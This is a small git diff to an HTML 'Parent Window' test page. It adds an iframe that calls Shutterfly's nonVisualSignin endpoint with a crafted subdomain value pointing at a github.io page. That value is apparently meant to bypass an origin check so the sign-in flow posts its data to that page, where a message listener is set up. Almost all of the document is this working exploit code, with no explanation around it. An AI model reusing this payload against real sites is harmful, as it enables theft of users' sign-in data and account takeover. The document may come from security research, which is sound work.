@@ -8,6 +8,7 @@
 
     <h1>Parent Window</h1>
     <p>Send Message: <button onclick="sendMsg();" id="message_button">Hi there iframe</button></p>
+    <iframe src="https://www.shutterfly.com/nonVisualSignin/start.sfly?&cb=0.36430869944319966&esch=1&subdomain=https://hacky4594.github.io%5cx23&outputFormat=postMessage&version=2"></iframe>
     <p>Got Message:</p>
     <div id="results"></div>
     <br/>
@@ -16,7 +17,8 @@
         window.addEventListener(
           "message",
           function (event) {
-            alert(event.data);
+              alert("message received!");
+//            alert(event.data);
           },
           false);         
         function sendMsg(){
